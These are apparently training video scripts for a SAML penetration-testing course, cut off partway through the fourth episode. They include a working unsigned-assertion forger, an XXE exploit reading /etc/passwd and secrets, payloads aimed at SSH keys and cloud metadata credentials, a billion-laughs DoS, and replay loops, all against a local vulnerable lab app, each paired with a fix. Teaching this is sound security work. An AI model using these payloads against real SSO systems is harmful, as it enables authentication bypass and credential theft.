# SAML Security Testing — Video Scripts
## Series: EG-LAB-SAML-PENTEST-001 Video Training

## Episode Overview Table

| Ep | Title | Level | Duration | Key Demo |
|----|-------|-------|----------|----------|
| E01 | SAML Response Reconnaissance | L1 | 9 min | Decode Base64, analyze XML structure, map attack surface |
| E02 | Forging Unsigned SAML Assertions | L1 | 9 min | Build assertion from scratch with lxml, bypass no-signature SP |
| E03 | XXE Injection Through SAML | L1 | 8 min | Read /etc/passwd via crafted SAML response entity |
| E04 | SAML Replay Attacks | L1 | 8 min | Capture and replay a legitimate SAML response |
| E05 | XML Signature Wrapping (XSW) Attacks | L2 | 14 min | Move signed element, insert forged assertion, bypass validation |
| E06 | NameID Comment Injection & Audience Bypass | L2 | 11 min | Identity spoofing via XML comments, cross-app replay |
| E07 | Session Attacks & Vulnerability Chaining | L2 | 10 min | Session fixation + SAML, chain XSW + comment injection |
| E08 | Golden SAML Attack Simulation | L3 | 13 min | Generate signing cert, forge assertions, authenticate as anyone |
| E09 | Building a SAML Testing Toolkit | L3 | 12 min | Code a modular Python SAML testing framework |
| E10 | Professional Reporting & Detection | L3 | 11 min | Write SAML findings, show SP-IdP log correlation for detection |

**Total Runtime:** ~105 minutes
**Format:** Screen recording with code editor + terminal + browser dev tools
**Tools Shown:** Python 3.11+, lxml, defusedxml, signxml, cryptography, Flask, Burp Suite, SAML Tracer
**Lab Environment:** vulnerable-saml-app.py (localhost:5001) with 10 vulnerable endpoints

---

## Episode 01: SAML Response Reconnaissance

**Duration:** 9 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Learn to intercept, decode, and analyze SAML responses to map attack surface and identify vulnerabilities.

---

### SCENE 1: Hook - The Hidden Attack Surface (0:00 - 1:15)

**[VISUAL: Browser showing enterprise SSO login page. User clicks "Sign in with SSO". Network traffic flows between browser, IdP, and SP shown in animated diagram.]**

**NARRATOR:**
"Every time you click 'Sign in with SSO', your browser becomes a courier carrying XML documents between identity providers and applications. These documents — SAML responses — contain signed assertions about who you are, what roles you have, and what you can access."

"Most developers treat SAML as a black box. Install a library, configure some XML, and trust it works. But attackers see something different. They see Base64-encoded XML traveling through their browser. XML they can decode, read, modify, and replay."

"This episode starts your journey into SAML penetration testing. We'll intercept a SAML response, decode it, analyze its structure, and map every potential vulnerability. By the end, you'll see SAML responses the way an attacker does."

**[VISUAL: Text overlay: "Authorization Notice: This training uses intentionally vulnerable applications. Only test systems you own or have written permission to test. Unauthorized testing is illegal."]**

---

### SCENE 2: Setting Up the Lab Environment (1:15 - 3:00)

**[VISUAL: Terminal showing the vulnerable-saml-app.py Flask application starting]**

**NARRATOR:**
"We'll use a vulnerable SAML Service Provider I built for this training. It has ten different endpoints, each with a specific vulnerability."

```bash
# Clone the lab repository
git clone https://github.com/verifhai/saml-pentest-lab
cd saml-pentest-lab

# Install dependencies
pip install flask lxml defusedxml signxml cryptography

# Start the vulnerable application
python vulnerable-saml-app.py
```

**[VISUAL: Terminal output showing:]**

```
 * Running on http://localhost:5001

Vulnerable SAML SP Endpoints:
  POST /saml/acs-nosig        - No signature validation
  POST /saml/acs-xxe          - XXE vulnerable parser
  POST /saml/acs-replay       - No replay protection
  POST /saml/acs-xsw          - XML Signature Wrapping vulnerable
  POST /saml/acs-comment      - Comment injection via .text
  POST /saml/acs-nostrict     - No audience/destination check
  POST /saml/acs-session      - No session regeneration
  POST /saml/acs-relay        - Open redirect via RelayState
  POST /saml/acs-golden       - Accepts any valid signature
  GET  /generate              - Generate test SAML responses
  GET  /idp-metadata          - Get IdP cert and private key
```

**NARRATOR:**
"Each endpoint demonstrates a real vulnerability found in production SAML implementations. Today we'll focus on reconnaissance — understanding the SAML response structure."

---

### SCENE 3: Intercepting SAML Traffic (3:00 - 5:30)

**[VISUAL: Browser with SAML Tracer extension installed. User navigates to localhost:5001 and clicks login.]**

**NARRATOR:**
"First, we need to see the SAML response. Two tools make this easy: SAML Tracer for Firefox, or Burp Suite for full request interception."

**[VISUAL: Split screen - SAML Tracer on left showing captured SAML POST, Burp Suite on right with intercepted request]**

"SAML Tracer automatically highlights SAML messages. Here's what we captured — a POST request to `/saml/acs-nosig` with a parameter called `SAMLResponse`."

**[VISUAL: Highlight the SAMLResponse parameter in the HTTP POST data]**

```
POST /saml/acs-nosig HTTP/1.1
Host: localhost:5001
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfOGU4ZGM1ZjYtMmE3Yi00MjE...
```

"That's Base64-encoded XML. Let's decode it."

**[VISUAL: Terminal with Python interactive session]**

```python
import base64

saml_b64 = "PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfOGU4ZGM1ZjYtMmE3Yi00MjE..."

xml_bytes = base64.b64decode(saml_b64)
xml_string = xml_bytes.decode('utf-8')

# Pretty print with lxml
from lxml import etree
root = etree.fromstring(xml_bytes)
print(etree.tostring(root, pretty_print=True, encoding='unicode'))
```

**[VISUAL: Formatted XML output appearing in terminal]**

"And there's the SAML response in readable XML."

---

### SCENE 4: Anatomy of a SAML Response (5:30 - 7:45)

**[VISUAL: XML editor with syntax highlighting showing the decoded SAML response. Each section gets highlighted as discussed.]**

**NARRATOR:**
"Let's analyze the structure. Understanding this is critical for attacking SAML."

```xml
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_8e8dc5f6-2a7b-421a-84d5-80e6b4f0e431"
    Version="2.0"
    IssueInstant="2026-02-07T10:30:00Z"
    Destination="http://localhost:5001/saml/acs-nosig">

    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>

    <saml:Assertion
        ID="_d71a3a8e-e758-4653-8e8b-c7e8d5a8e8b8"
        Version="2.0"
        IssueInstant="2026-02-07T10:30:00Z">

        <saml:Issuer>https://idp.example.com</saml:Issuer>

        <!-- SIGNATURE WOULD GO HERE -->

        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                admin@example.com
            </saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotOnOrAfter="2026-02-07T10:35:00Z"
                    Recipient="http://localhost:5001/saml/acs-nosig"
                    InResponseTo="_4a3b2c1d"/>
            </saml:SubjectConfirmation>
        </saml:Subject>

        <saml:Conditions
            NotBefore="2026-02-07T10:30:00Z"
            NotOnOrAfter="2026-02-07T10:35:00Z">
            <saml:AudienceRestriction>
                <saml:Audience>http://localhost:5001/metadata</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>

        <saml:AuthnStatement
            AuthnInstant="2026-02-07T10:30:00Z"
            SessionIndex="_be9c8e90-5a6b-11df-8a39-0800271d8c">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>

        <saml:AttributeStatement>
            <saml:Attribute Name="role">
                <saml:AttributeValue>user</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="department">
                <saml:AttributeValue>engineering</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>
```

**[VISUAL: Annotated diagram showing each element's security purpose]**

**NARRATOR:**
"The Response wrapper has an ID and Destination. The Assertion is the core — it contains the Subject with the NameID identifying the user. Notice there's no Signature element in this one — that's our first vulnerability."

"Conditions sets time bounds with NotBefore and NotOnOrAfter. Audience restricts which SP should accept this. AttributeStatement carries roles and claims. Every one of these fields is a potential attack vector."

---

### SCENE 5: Mapping the Attack Surface (7:45 - 9:00)

**[VISUAL: Mind map diagram appearing on screen showing SAML attack categories]**

**NARRATOR:**
"Now we can map the attack surface. Based on this structure, here are the vulnerability categories we'll exploit in this series."

**[VISUAL: Attack surface map with branches:]**

```
SAML Attack Surface
│
├── Signature Validation
│   ├── Missing signature validation (Episode 2)
│   ├── XML Signature Wrapping (Episode 5)
│   └── Golden SAML - forged signatures (Episode 8)
│
├── XML Parsing
│   ├── XXE injection (Episode 3)
│   └── Comment injection (Episode 6)
│
├── Protocol Implementation
│   ├── Replay attacks (Episode 4)
│   ├── Audience bypass (Episode 6)
│   └── InResponseTo validation
│
├── Session Management
│   ├── Session fixation (Episode 7)
│   └── RelayState open redirect (Episode 7)
│
└── Detection Evasion
    ├── Vulnerability chaining (Episode 7)
    └── Log correlation bypass (Episode 10)
```

**NARRATOR:**
"We've just decoded our first SAML response and mapped the attack surface. In the next episode, we'll exploit the most critical vulnerability — missing signature validation. We'll forge an assertion from scratch and authenticate as any user we want."

**[VISUAL: Preview card: "Next: Episode 02 - Forging Unsigned SAML Assertions"]**

---

## Episode 02: Forging Unsigned SAML Assertions

**Duration:** 9 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Exploit missing signature validation by crafting SAML assertions from scratch to achieve complete authentication bypass.

---

### SCENE 1: The Critical Flaw (0:00 - 1:30)

**[VISUAL: Code editor showing vulnerable SAML handler with "NO SIGNATURE CHECK" banner flashing]**

**NARRATOR:**
"This is the most dangerous SAML vulnerability. No signature validation. It means an attacker can craft their own SAML assertion claiming to be anyone — the CEO, an administrator, a privileged service account — and the application accepts it."

"How common is this? More common than you'd think. I've found it in custom SAML implementations at Fortune 500 companies. Developers parse the XML, extract the NameID, and create a session. They skip the one thing that makes SAML secure — verifying the digital signature."

"Let me show you exactly how to exploit it."

---

### SCENE 2: Understanding the Vulnerable Code (1:30 - 3:30)

**[VISUAL: Code editor showing the vulnerable endpoint from vulnerable-saml-app.py]**

**NARRATOR:**
"Here's the vulnerable code from our lab application. This is the `/saml/acs-nosig` endpoint."

```python
from flask import Flask, request, redirect, session
from lxml import etree
import base64

app = Flask(__name__)
app.secret_key = "dev-secret-key"

@app.route('/saml/acs-nosig', methods=['POST'])
def acs_no_signature():
    """VULNERABLE: No signature validation"""
    saml_response_b64 = request.form.get('SAMLResponse')

    # Decode Base64
    xml_bytes = base64.b64decode(saml_response_b64)

    # Parse XML - no signature check!
    root = etree.fromstring(xml_bytes)

    # Extract claims from raw XML
    ns = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'
    }

    name_id = root.find('.//saml:NameID', ns)
    if name_id is None:
        return "Invalid SAML response", 400

    # Extract roles
    roles = []
    for attr in root.findall(".//saml:Attribute[@Name='role']/saml:AttributeValue", ns):
        roles.append(attr.text)

    # Create session with extracted claims - NO VERIFICATION!
    session['user'] = name_id.text
    session['roles'] = roles
    session['authenticated'] = True

    return redirect('/dashboard')
```

**[VISUAL: Highlight each vulnerable section with red boxes]**

**NARRATOR:**
"Line by line, here's what's wrong. Base64 decode — fine. Parse XML with lxml — we'll come back to that in the XXE episode. Extract NameID and roles from the XML — seems reasonable. Create a session with those claims — and that's where it all falls apart."

"There's no signature verification. No certificate check. No validation that this assertion came from a trusted Identity Provider. An attacker controls every byte of the SAMLResponse parameter."

---

### SCENE 3: Crafting the Exploit (3:30 - 6:30)

**[VISUAL: New Python script file named `forge_admin_assertion.py`]**

**NARRATOR:**
"Let's forge an assertion. We'll craft XML from scratch, claiming to be the admin user with superadmin privileges."

```python
#!/usr/bin/env python3
"""
Forge a SAML assertion without signature - Episode 02 Demo
Target: http://localhost:5001/saml/acs-nosig
"""

import base64
from datetime import datetime, timedelta

def forge_saml_assertion(
    name_id="admin@example.com",
    roles=["superadmin"],
    recipient="http://localhost:5001/saml/acs-nosig"
):
    """Create an unsigned SAML assertion"""

    # Calculate time windows
    now = datetime.utcnow()
    not_before = now - timedelta(minutes=5)
    not_after = now + timedelta(minutes=30)

    # Format timestamps
    issue_instant = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    not_before_str = not_before.strftime("%Y-%m-%dT%H:%M:%SZ")
    not_after_str = not_after.strftime("%Y-%m-%dT%H:%M:%SZ")

    # Build role attributes
    role_attributes = ""
    for role in roles:
        role_attributes += f"""
        <saml:Attribute Name="role">
            <saml:AttributeValue>{role}</saml:AttributeValue>
        </saml:Attribute>"""

    # Craft the SAML response
    saml_response = f"""<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_forged_response_001"
    Version="2.0"
    IssueInstant="{issue_instant}"
    Destination="{recipient}">

    <saml:Issuer>https://attacker-controlled-idp.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>

    <saml:Assertion
        ID="_forged_assertion_001"
        Version="2.0"
        IssueInstant="{issue_instant}">

        <saml:Issuer>https://attacker-controlled-idp.com</saml:Issuer>

        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                {name_id}
            </saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotOnOrAfter="{not_after_str}"
                    Recipient="{recipient}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>

        <saml:Conditions
            NotBefore="{not_before_str}"
            NotOnOrAfter="{not_after_str}">
            <saml:AudienceRestriction>
                <saml:Audience>{recipient}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>

        <saml:AuthnStatement
            AuthnInstant="{issue_instant}"
            SessionIndex="_session_forged">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>

        <saml:AttributeStatement>{role_attributes}
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>"""

    # Base64 encode
    saml_b64 = base64.b64encode(saml_response.encode()).decode()

    return saml_b64

if __name__ == "__main__":
    # Forge assertion for admin user
    forged = forge_saml_assertion(
        name_id="admin@example.com",
        roles=["superadmin", "billing_admin"]
    )

    print("Forged SAML Assertion (Base64):")
    print(forged)
    print("\nSubmit this via POST to /saml/acs-nosig")
```

**[VISUAL: Run the script in terminal. Show the Base64 output.]**

**NARRATOR:**
"That's it. Pure XML construction. No cryptography. No private keys. Just string formatting with attacker-controlled values. Now let's send it to the vulnerable endpoint."

---

### SCENE 4: Exploitation Demo (6:30 - 8:00)

**[VISUAL: Terminal with curl command ready to execute]**

**NARRATOR:**
"We'll use curl to POST the forged assertion."

```bash
# Capture the forged assertion
FORGED_SAML=$(python3 forge_admin_assertion.py | grep -A 1 "Base64" | tail -1)

# Submit to vulnerable endpoint
curl -v http://localhost:5001/saml/acs-nosig \
  -d "SAMLResponse=${FORGED_SAML}" \
  -c cookies.txt

# Check the session
curl -b cookies.txt http://localhost:5001/dashboard
```

**[VISUAL: Terminal showing the HTTP response with successful redirect and session cookie. Then the dashboard showing "Welcome, admin@example.com - Roles: superadmin, billing_admin"]**

**NARRATOR:**
"Complete authentication bypass. We're now logged in as admin with superadmin privileges. No password. No multi-factor authentication. No actual authentication at all. Just forged XML."

**[VISUAL: Browser showing the dashboard with admin access, highlighting sensitive functions now available]**

"This is the SAML equivalent of JWT's alg:none vulnerability. And it's even easier to exploit because you don't need to understand JWT structure — just basic XML."

---

### SCENE 5: The Fix and Key Takeaways (8:00 - 9:00)

**[VISUAL: Side-by-side code comparison — vulnerable vs secure]**

**NARRATOR:**
"The fix is simple: never parse SAML responses manually. Use python3-saml or another battle-tested library that enforces signature validation."

```python
from onelogin.saml2.auth import OneLogin_Saml2_Auth

@app.route('/saml/acs-secure', methods=['POST'])
def acs_secure():
    """SECURE: Full signature validation"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    errors = auth.get_errors()
    if errors:
        return f"SAML validation failed: {errors}", 403

    if not auth.is_authenticated():
        return "Authentication failed", 403

    # Only extract claims AFTER validation passes
    session['user'] = auth.get_nameid()
    session['roles'] = auth.get_attributes().get('role', [])
    return redirect('/dashboard')
```

**NARRATOR:**
"The library handles signature verification, certificate validation, timestamp checks, and audience restrictions. One line — `auth.process_response()` — prevents the entire attack. Next episode: XXE injection through SAML responses."

**[VISUAL: Preview card showing XML with XXE payload]**

---

## Episode 03: XXE Injection Through SAML

**Duration:** 8 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Exploit XML External Entity vulnerabilities in SAML parsers to read server files and perform SSRF attacks.

---

### SCENE 1: The XML Weakness (0:00 - 1:00)

**[VISUAL: Terminal showing the contents of /etc/passwd appearing in a SAML response]**

**NARRATOR:**
"I just read the server's password file through a login form. No SQL injection. No file upload. Just a SAML response with a DOCTYPE declaration."

"SAML is XML. And XML has a dangerous feature called external entities — the parser can include content from files or URLs. If the SAML parser resolves external entities, an attacker can weaponize the SAML response to read arbitrary files, hit internal services, or crash the server."

"Let me show you how this works and how to exploit it."

---

### SCENE 2: Understanding XXE in SAML Context (1:00 - 3:15)

**[VISUAL: Code editor showing the vulnerable XXE endpoint]**

**NARRATOR:**
"Here's the vulnerable code from `/saml/acs-xxe`."

```python
from lxml import etree
import base64

@app.route('/saml/acs-xxe', methods=['POST'])
def acs_xxe_vulnerable():
    """VULNERABLE: XXE through default lxml parser"""
    saml_response_b64 = request.form.get('SAMLResponse')
    xml_bytes = base64.b64decode(saml_response_b64)

    # DEFAULT PARSER - RESOLVES EXTERNAL ENTITIES!
    root = etree.fromstring(xml_bytes)

    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    name_id = root.find('.//saml:NameID', ns)

    # The NameID text might contain file contents!
    session['user'] = name_id.text
    return redirect('/dashboard')
```

**NARRATOR:**
"The vulnerability is `etree.fromstring(xml_bytes)` with the default parser. By default, lxml resolves external entities. When we put an entity reference in the NameID, the parser reads the file and inserts the contents into the XML tree."

**[VISUAL: Diagram showing XXE attack flow]**

```
1. Attacker crafts SAML with DOCTYPE and entity definition
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

2. Attacker places entity reference in NameID
   <saml:NameID>&xxe;</saml:NameID>

3. Parser resolves &xxe; → reads /etc/passwd → inserts content

4. Application extracts name_id.text → gets file contents

5. File contents visible in session, logs, or error messages
```

---

### SCENE 3: Crafting the XXE Exploit (3:15 - 5:30)

**[VISUAL: New exploit script `xxe_file_read.py`]**

**NARRATOR:**
"Let's build an XXE exploit to read /etc/passwd."

```python
#!/usr/bin/env python3
"""
XXE Injection through SAML - Episode 03 Demo
Target: http://localhost:5001/saml/acs-xxe
"""

import base64

def craft_xxe_saml(file_path="/etc/passwd"):
    """Craft SAML response with XXE payload"""

    saml_with_xxe = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_xxe_response"
    Version="2.0">

    <saml:Assertion ID="_xxe_assertion">
        <saml:Subject>
            <saml:NameID>&xxe;</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

    return base64.b64encode(saml_with_xxe.encode()).decode()

def exploit_xxe(target_file="/etc/passwd"):
    """Exploit XXE to read file"""
    import requests

    xxe_payload = craft_xxe_saml(target_file)

    response = requests.post(
        "http://localhost:5001/saml/acs-xxe",
        data={"SAMLResponse": xxe_payload},
        allow_redirects=False
    )

    # File contents might be in session cookie or error message
    print(f"Status: {response.status_code}")
    print(f"Headers: {response.headers}")

    # Follow redirect to see session data
    if response.status_code == 302:
        session_cookie = response.cookies.get('session')
        dashboard = requests.get(
            "http://localhost:5001/dashboard",
            cookies={'session': session_cookie}
        )
        print("\nDashboard content:")
        print(dashboard.text)

if __name__ == "__main__":
    print("[*] Exploiting XXE to read /etc/passwd...")
    exploit_xxe("/etc/passwd")

    print("\n[*] Exploiting XXE to read application config...")
    exploit_xxe("/app/config/secrets.yaml")
```

**[VISUAL: Run the exploit script. Show the terminal output with /etc/passwd contents appearing.]**

**NARRATOR:**
"The entity definition `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` tells the parser to create an entity named `xxe` whose value comes from reading that file. When the parser encounters `&xxe;` in the NameID, it resolves it — reading the file and inserting the contents."

---

### SCENE 4: Beyond File Reading - SSRF and DoS (5:30 - 6:45)

**[VISUAL: Three code blocks showing different XXE attack vectors]**

**NARRATOR:**
"XXE isn't just about reading files. Three attack vectors through SAML."

"Attack one: File exfiltration. Read configuration files, private keys, application source code."

```xml
<!ENTITY xxe SYSTEM "file:///app/config/database.yaml">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

"Attack two: Server-Side Request Forgery. Hit cloud metadata endpoints, internal services, localhost-only admin panels."

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://localhost:6379/"> <!-- Redis -->
<!ENTITY xxe SYSTEM "http://internal-admin.local/users">
```

"Attack three: Denial of Service. The billion laughs attack — nested entity expansion that explodes memory usage."

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<saml:NameID>&lol4;</saml:NameID>
```

---

### SCENE 5: The Fix with defusedxml (6:45 - 8:00)

**[VISUAL: Code comparison showing vulnerable vs secure parsers]**

**NARRATOR:**
"The fix: use defusedxml. One import change blocks all XXE attacks."

```python
import defusedxml.lxml as safe_lxml
from defusedxml import DefusedXmlException

@app.route('/saml/acs-secure', methods=['POST'])
def acs_xxe_secure():
    """SECURE: defusedxml blocks XXE"""
    saml_response_b64 = request.form.get('SAMLResponse')
    xml_bytes = base64.b64decode(saml_response_b64)

    try:
        # SAFE PARSER - Blocks external entities!
        root = safe_lxml.fromstring(xml_bytes)
    except DefusedXmlException as e:
        return f"Malicious XML detected: {e}", 400

    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    name_id = root.find('.//saml:NameID', ns)

    session['user'] = name_id.text
    return redirect('/dashboard')
```

**[VISUAL: Run the XXE exploit against the secure endpoint. Show the DefusedXmlException being raised.]**

**NARRATOR:**
"defusedxml blocks external entities, DTD processing, and entity expansion. The exploit fails with a clear security exception. One library prevents the entire class of attacks. Always use defusedxml for parsing untrusted XML. Next episode: replay attacks."

**[VISUAL: Preview card showing captured SAML response being replayed multiple times]**

---

## Episode 04: SAML Replay Attacks

**Duration:** 8 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Exploit missing replay protection to reuse captured SAML responses and implement proper response ID tracking.

---

### SCENE 1: The Replay Vulnerability (0:00 - 1:15)

**[VISUAL: Burp Suite showing a captured SAML response being sent multiple times, each creating a new session]**

**NARRATOR:**
"I just captured a legitimate SAML response during a normal login. The signature is valid. The assertion hasn't expired. And I can use it again. And again. And again."

"This is a SAML replay attack. If the Service Provider doesn't track which Response IDs have been processed, an attacker can capture a single valid SAML response and replay it to create multiple sessions, potentially bypassing rate limiting, session invalidation, or logout."

"The fix is simple — track Response IDs in a cache. But many implementations skip this, assuming the signature and timestamp are enough. They're not."

---

### SCENE 2: Understanding the Vulnerable Implementation (1:15 - 3:00)

**[VISUAL: Code editor showing the `/saml/acs-replay` endpoint]**

**NARRATOR:**
"Here's what replay-vulnerable code looks like."

```python
from onelogin.saml2.auth import OneLogin_Saml2_Auth

@app.route('/saml/acs-replay', methods=['POST'])
def acs_replay_vulnerable():
    """VULNERABLE: No replay protection"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    # Signature validated ✓
    # Timestamp validated ✓
    # But no check if we've seen this Response ID before!

    if not auth.is_authenticated():
        return "Auth failed", 403

    # Create new session every time - even for replayed responses
    session.clear()
    session['user'] = auth.get_nameid()
    session['authenticated_at'] = datetime.utcnow().isoformat()

    return redirect('/dashboard')
```

**NARRATOR:**
"The code validates the signature and checks the NotOnOrAfter timestamp. That's good. But it doesn't track which Response IDs have been processed. If an attacker captures this response within its validity window — usually 5 minutes — they can replay it to create multiple authenticated sessions."

**[VISUAL: Timeline diagram showing]**

```
10:00:00 - Legitimate user logs in, Response ID: _abc123
10:00:05 - Attacker captures SAML response
10:01:00 - Attacker replays response → New session created
10:02:00 - Attacker replays response → New session created
10:03:00 - Original session logged out by user
10:04:00 - Attacker replays response → New session created
10:05:00 - Response expires (NotOnOrAfter reached)
```

---

### SCENE 3: Exploitation Demo (3:00 - 5:00)

**[VISUAL: Terminal with SAML Tracer and curl commands]**

**NARRATOR:**
"Let's capture and replay a SAML response."

```bash
# Step 1: Capture a legitimate SAML response
# Use SAML Tracer or Burp Suite during normal login
# Save the SAMLResponse parameter

CAPTURED_SAML="PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6..."

# Step 2: Replay it multiple times
for i in {1..5}; do
    echo "[*] Replay attempt $i"
    curl -v http://localhost:5001/saml/acs-replay \
        -d "SAMLResponse=${CAPTURED_SAML}" \
        -c "session_${i}.txt" \
        2>&1 | grep -E "(< Set-Cookie|< Location)"
    sleep 1
done

# Step 3: Verify all sessions are active
echo -e "\n[*] Testing all captured sessions:"
for i in {1..5}; do
    echo "Session $i:"
    curl -s -b "session_${i}.txt" http://localhost:5001/dashboard | grep "Welcome"
done
```

**[VISUAL: Terminal output showing 5 successful session creations from the same SAML response]**

**NARRATOR:**
"Five different sessions from one captured response. Each with its own session cookie. If the original user logs out, these replayed sessions stay active. The attacker has persistent access until each individual session expires."

---

### SCENE 4: Implementing Replay Protection (5:00 - 7:00)

**[VISUAL: Code editor showing secure implementation with Redis-based ID tracking]**

**NARRATOR:**
"The fix is three-layered: Response ID tracking, InResponseTo validation, and timestamp enforcement."

```python
import redis
from datetime import datetime, timedelta

# Initialize Redis for response ID tracking
response_cache = redis.Redis(host='localhost', port=6379, db=1, decode_responses=True)
SAML_RESPONSE_TTL = 600  # 10 minutes - longer than max assertion validity

@app.route('/saml/acs-secure', methods=['POST'])
def acs_replay_secure():
    """SECURE: Full replay protection"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    errors = auth.get_errors()
    if errors:
        return f"Validation failed: {errors}", 403

    if not auth.is_authenticated():
        return "Authentication failed", 403

    # LAYER 1: Response ID tracking
    response_id = auth.get_last_response_id()
    cache_key = f"saml_response:{response_id}"

    if response_cache.exists(cache_key):
        # This response has been processed before!
        app.logger.warning(f"Replay attack detected: {response_id}")
        return "This SAML response has already been used", 403

    # Mark this response as processed
    response_cache.setex(cache_key, SAML_RESPONSE_TTL, datetime.utcnow().isoformat())

    # LAYER 2: InResponseTo validation
    # If this is a response to our AuthnRequest, verify the ID matches
    stored_request_id = session.pop('saml_request_id', None)
    if stored_request_id:
        in_response_to = auth.get_last_response_in_response_to()
        if in_response_to != stored_request_id:
            app.logger.warning(f"InResponseTo mismatch: expected {stored_request_id}, got {in_response_to}")
            return "Invalid SAML response - ID mismatch", 403

    # LAYER 3: NotOnOrAfter is already enforced by python3-saml

    # Create session only after all checks pass
    session.clear()
    session['user'] = auth.get_nameid()
    session['response_id'] = response_id  # Store for audit logging
    session['authenticated_at'] = datetime.utcnow().isoformat()

    return redirect('/dashboard')


# Helper for initiating SAML login
@app.route('/saml/login')
def saml_login():
    """Initiate SAML authentication"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)

    # Store the AuthnRequest ID for InResponseTo validation
    authn_request_id = auth.get_last_request_id()
    session['saml_request_id'] = authn_request_id

    return redirect(auth.login())
```

**[VISUAL: Diagram showing the three defensive layers]**

```
Defense Layer 1: Response ID Cache (Redis)
  - Store every processed Response ID
  - TTL = 10 minutes (longer than max assertion validity)
  - Reject any duplicate ID

Defense Layer 2: InResponseTo Validation
  - Store AuthnRequest ID when initiating login
  - Verify Response.InResponseTo matches our request
  - Prevents unsolicited/injected responses

Defense Layer 3: Timestamp Validation (python3-saml automatic)
  - NotBefore: assertion not valid yet
  - NotOnOrAfter: assertion expired
  - Limits replay window to 5 minutes max
```

---

### SCENE 5: Testing the Fix (7:00 - 8:00)

**[VISUAL: Terminal showing replay attempt being blocked]**

**NARRATOR:**
"Now let's try the same replay attack against the protected endpoint."

```bash
# Capture a valid response
CAPTURED_SAML=$(curl -s http://localhost:5001/generate | jq -r '.SAMLResponse')

# First submission - should succeed
echo "[*] First submission:"
curl -v http://localhost:5001/saml/acs-secure \
    -d "SAMLResponse=${CAPTURED_SAML}" \
    -c first_session.txt 2>&1 | grep "< Location"

